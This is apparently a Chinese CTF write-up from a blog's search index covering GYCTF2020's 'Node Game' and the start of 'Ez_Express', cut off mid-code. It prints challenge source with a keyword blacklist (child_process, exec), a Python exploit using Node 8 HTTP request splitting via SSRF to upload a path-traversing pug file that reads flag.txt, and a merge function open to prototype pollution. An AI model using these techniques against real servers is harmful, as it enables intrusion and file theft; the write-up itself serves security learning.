<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>GYCTF2020复现记录(一)</title>
    <link href="/2021/04/19/2020GYCTF%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95(%E4%B8%80)/"/>
    <url>/2021/04/19/2020GYCTF%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020复现记录-一"><a href="#GYCTF2020复现记录-一" class="headerlink" title="GYCTF2020复现记录(一)"></a>GYCTF2020复现记录(一)</h2><h3 id="WEB-Node-Game"><a href="#WEB-Node-Game" class="headerlink" title="[WEB]Node Game"></a>[WEB]Node Game</h3><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>可以查看源码，代码审计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> app = express();<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> pug = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;pug&#x27;</span>);<br><span class="hljs-keyword">var</span> morgan = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);<br><br><br>app.use(multer(&#123;<span class="hljs-attr">dest</span>: <span class="hljs-string">&#x27;./dist&#x27;</span>&#125;).array(<span class="hljs-string">&#x27;file&#x27;</span>));<br>app.use(morgan(<span class="hljs-string">&#x27;short&#x27;</span>));<br>app.use(<span class="hljs-string">&quot;/uploads&quot;</span>,express.static(path.join(__dirname, <span class="hljs-string">&#x27;/uploads&#x27;</span>)))<br>app.use(<span class="hljs-string">&quot;/template&quot;</span>,express.static(path.join(__dirname, <span class="hljs-string">&#x27;/template&#x27;</span>)))<br><br><br>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> action = req.query.action?req.query.action:<span class="hljs-string">&quot;index&quot;</span>;<br>    <span class="hljs-keyword">if</span>( action.includes(<span class="hljs-string">&quot;/&quot;</span>) || action.includes(<span class="hljs-string">&quot;\\&quot;</span>) )&#123;<br>        res.send(<span class="hljs-string">&quot;Errrrr, You have been Blocked&quot;</span>);<br>    &#125;<br>    file = path.join(__dirname + <span class="hljs-string">&#x27;/template/&#x27;</span>+ action +<span class="hljs-string">&#x27;.pug&#x27;</span>);<br>    <span class="hljs-keyword">var</span> html = pug.renderFile(file);<br>    res.send(html);<br>&#125;);<br><br>app.post(<span class="hljs-string">&#x27;/file_upload&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    <span class="hljs-keyword">var</span> ip = req.connection.remoteAddress;<br>    <span class="hljs-keyword">var</span> obj = &#123;<br>        msg: <span class="hljs-string">&#x27;&#x27;</span>,<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!ip.includes(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)) &#123;<br>        obj.msg=<span class="hljs-string">&quot;only admin&#x27;s ip can use it&quot;</span><br>        res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>        <span class="hljs-keyword">return</span> <br>    &#125;<br>    fs.readFile(req.files[<span class="hljs-number">0</span>].path, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, data</span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(err)&#123;<br>            obj.msg = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">var</span> file_path = <span class="hljs-string">&#x27;/uploads/&#x27;</span> + req.files[<span class="hljs-number">0</span>].mimetype +<span class="hljs-string">&quot;/&quot;</span>;<br>            <span class="hljs-keyword">var</span> file_name = req.files[<span class="hljs-number">0</span>].originalname<br>            <span class="hljs-keyword">var</span> dir_file = __dirname + file_path + file_name<br>            <span class="hljs-keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fs.mkdirSync(__dirname + file_path)<br>                &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                    obj.msg = <span class="hljs-string">&quot;file type error&quot;</span>;<br>                    res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>                    <span class="hljs-keyword">return</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fs.writeFileSync(dir_file,data)<br>                obj = &#123;<br>                    msg: <span class="hljs-string">&#x27;upload success&#x27;</span>,<br>                    filename: file_path + file_name<br>                &#125; <br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                obj.msg = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            &#125;<br>            res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));    <br>        &#125;<br>    &#125;)<br>&#125;)<br><br>app.get(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>    res.sendFile(path.join(__dirname + <span class="hljs-string">&#x27;/template/source.txt&#x27;</span>));<br>&#125;);<br><br><br>app.get(<span class="hljs-string">&#x27;/core&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> q = req.query.q;<br>    <span class="hljs-keyword">var</span> resp = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (q) &#123;<br>        <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;http://localhost:8081/source?&#x27;</span> + q<br>        <span class="hljs-built_in">console</span>.log(url)<br>        <span class="hljs-keyword">var</span> trigger = blacklist(url);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            res.send(<span class="hljs-string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                http.get(url, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">resp</span>) </span>&#123;<br>                    resp.setEncoding(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>                    resp.on(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) </span>&#123;<br>                    <span class="hljs-keyword">if</span> (err.code === <span class="hljs-string">&quot;ECONNRESET&quot;</span>) &#123;<br>                     <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Timeout occurs&quot;</span>);<br>                     <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                   &#125;);<br><br>                    resp.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>) </span>&#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                         resps = chunk.toString();<br>                         res.send(resps);<br>                        &#125;<span class="hljs-keyword">catch</span> (e) &#123;<br>                           res.send(e.message);<br>                        &#125;<br> <br>                    &#125;).on(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>                         res.send(e.message);&#125;);<br>                &#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                <span class="hljs-built_in">console</span>.log(error);<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.send(<span class="hljs-string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);<br>    &#125;<br>&#125;)<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params">url</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>,<span class="hljs-string">&quot;mainModule&quot;</span>,<span class="hljs-string">&quot;require&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;child_process&quot;</span>,<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>];<br>    <span class="hljs-keyword">var</span> arrayLen = evilwords.length;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arrayLen; i++) &#123;<br>        <span class="hljs-keyword">const</span> trigger = url.includes(evilwords[i]);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> server = app.listen(<span class="hljs-number">8081</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> host = server.address().address<br>    <span class="hljs-keyword">var</span> port = server.address().port<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)<br>&#125;)<br></code></pre></td></tr></table></figure><p>通过审计发现存在以下功能：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-string">&#x27;/&#x27;</span><span class="hljs-comment"> //index</span><br><span class="hljs-built_in">post</span> /file_upload<span class="hljs-comment"> //文件上传</span><br><span class="hljs-built_in">get</span> /source<span class="hljs-comment"> //查看源码</span><br><span class="hljs-built_in">get</span> /core<span class="hljs-comment"> //存在SSRF</span><br></code></pre></td></tr></table></figure><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>核心代码分析：</p><p>get /core 存在SSRF，对我们传入的q参数进行拼接：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span> = <span class="hljs-string">&#x27;http://localhost:8081/source?&#x27;</span> + q<br></code></pre></td></tr></table></figure><p>然后通过<code>blacklist</code>函数进行验证，<code>blacklist</code>函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params">url</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>,<span class="hljs-string">&quot;mainModule&quot;</span>,<span class="hljs-string">&quot;require&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;child_process&quot;</span>,<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>];<br>    <span class="hljs-keyword">var</span> arrayLen = evilwords.length;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arrayLen; i++) &#123;<br>        <span class="hljs-keyword">const</span> trigger = url.includes(evilwords[i]);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对敏感函数进行了过滤。</p><p>post /file_upload 是个文件上传的地方，需要满足以下条件：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ip.<span class="hljs-keyword">includes</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>首页还存在提示：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417203837.png" alt="image-20210417203836999"></p><p>存在SSRF+nodejs 想到了http拆分攻击，Node 版本为 8.12.0，存在漏洞，因此可以利用上传功能。</p><p>提示了pug，同时模板渲染采用的是pug引擎：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417204312.png" alt="image-20210417204312204"></p><p>看一下<a href="https://pugjs.org/zh-cn/language/includes.html"> pug 引擎文档：</a></p><p>从代码可以看到存在一个/template模板目录，存放着后缀为pug的模板文件，看下文档里边的包含语法，那么我们可以上传一个pug文件，pug文件里写入恶意的包含代码，包含我们要读的文件，在模板渲染的时候就会包含目标文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//- index.pug</span><br>doctype html<br>html<br>  head<br>    style<br>      include style.css<br>      <br></code></pre></td></tr></table></figure><p>思路就很明显了，因为限制了本地上传我们利用nodejs 的SSRF构造一个post请求，上传pug文件，包含读取任意文件。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>构造post请求，采用抓包的方法获取上传请求：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417205203.png" alt="image-20210417205203592"></p><p>直接上传会提示：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417205422.png" alt="image-20210417205421796"></p><p>构造exp：利用nodejs ssrf构造post请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*-coding:utf-8</span><br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27; HTTP/1.1</span><br><span class="hljs-string">Host: x</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /file_upload HTTP/1.1</span><br><span class="hljs-string">Host: x</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=---------------------------303312354614442</span><br><span class="hljs-string">Content-Length: 317</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------303312354614442</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;v1sun.pug&quot;</span><br><span class="hljs-string">Content-Type: /../template</span><br><span class="hljs-string"></span><br><span class="hljs-string">//- v1sun.pug</span><br><span class="hljs-string">doctype html</span><br><span class="hljs-string">html</span><br><span class="hljs-string">  head</span><br><span class="hljs-string">    style</span><br><span class="hljs-string">      include ../../../../../../../../../../../../flag.txt</span><br><span class="hljs-string">      </span><br><span class="hljs-string">-----------------------------303312354614442--</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">GET /flag HTTP/1.1</span><br><span class="hljs-string">Host: x</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">x:&#x27;&#x27;&#x27;</span><br><br>payload = payload.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\r\n&quot;</span>)<br>payload = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xff&#x27;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> payload)<br><span class="hljs-comment">#print(payload)</span><br><span class="hljs-comment">#print (urllib.parse.quote(payload))</span><br><br>r = requests.get(<span class="hljs-string">&#x27;http://1b1aa7a2-6ecd-4a57-b9de-5bbebae5c2a0.node3.buuoj.cn/core?q=&#x27;</span>+ urllib.parse.quote(payload))<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p><code>Content-Type</code>处存在一个小trick，利用nodejs的目录穿越，上传到模板目录：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417211406.png" alt="image-20210417211406073"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">Content-Type: <span class="hljs-regexp">/../</span>template<br></code></pre></td></tr></table></figure><p>同时要修改：<code>Connection: keep-alive</code> 以至于让我们的所有请求包含进去</p><p>上传后访问：<code>?action=v1sun</code> 查看源码就得到flag</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417210638.png" alt="image-20210417210637714"></p><h3 id="WEB-Ez-Express"><a href="#WEB-Ez-Express" class="headerlink" title="[WEB]Ez_Express"></a>[WEB]Ez_Express</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404212051710.png" alt="image-20210404212051710"></p><p>但是ADMIN注册不了，利用TEST注册登录后查看源码：TEST 123456</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404212126997.png" alt="image-20210404212126997"></p><p>下载源码</p><h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>审计发现是nodejs：app.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> createError = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http-errors&#x27;</span>);<br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">var</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">var</span> logger = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;randomatic&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><br><span class="hljs-keyword">var</span> indexRouter = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./routes/index&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = express();<br><br><span class="hljs-comment">// view engine setup</span><br>app.set(<span class="hljs-string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.disable(<span class="hljs-string">&#x27;etag&#x27;</span>);<br>app.use(bodyParser.urlencoded(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>&#125;)).use(bodyParser.json())<br>app.use(session(&#123;<br>    name: <span class="hljs-string">&#x27;session&#x27;</span>,<br>    secret: randomize(<span class="hljs-string">&#x27;aA0&#x27;</span>, <span class="hljs-number">16</span>),<br>    resave: <span class="hljs-literal">false</span>,<br>    saveUninitialized: <span class="hljs-literal">false</span><br>&#125;))<br>app.use(logger(<span class="hljs-string">&#x27;dev&#x27;</span>));<br>app.use(express.json());<br>app.use(express.urlencoded(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.use(cookieParser());<br>app.use(express.static(path.join(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br>app.use(<span class="hljs-string">&#x27;/&#x27;</span>, indexRouter);<br><br><span class="hljs-comment">// catch 404 and forward to error handler</span><br>app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  next(createError(<span class="hljs-number">404</span>));<br>&#125;);<br><br><span class="hljs-comment">// error handler</span><br>app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) </span>&#123;<br>  <span class="hljs-comment">// set locals, only providing error in development</span><br>  res.locals.message = err.message;<br>  res.locals.error = req.app.get(<span class="hljs-string">&#x27;env&#x27;</span>) === <span class="hljs-string">&#x27;development&#x27;</span> ? err : &#123;&#125;;<br><br>  <span class="hljs-comment">// render the error page</span><br>  res.status(err.status || <span class="hljs-number">500</span>);<br>  res.render(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;);<br><br><span class="hljs-built_in">module</span>.exports = app;<br><br></code></pre></td></tr></table></figure><p>app.js没什么特别关注的点。</p><p>index.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span>;<br><span class="hljs-keyword">const</span> merge = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>    <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;<br>      merge(a[attr], b[attr]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      a[attr] = b[attr];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a<br>&#125;<br><span class="hljs-keyword">const</span> clone = <span class="hljs-function">(<span class="hljs-params">a</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> merge(&#123;&#125;, a);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeKeyword</span>(<span 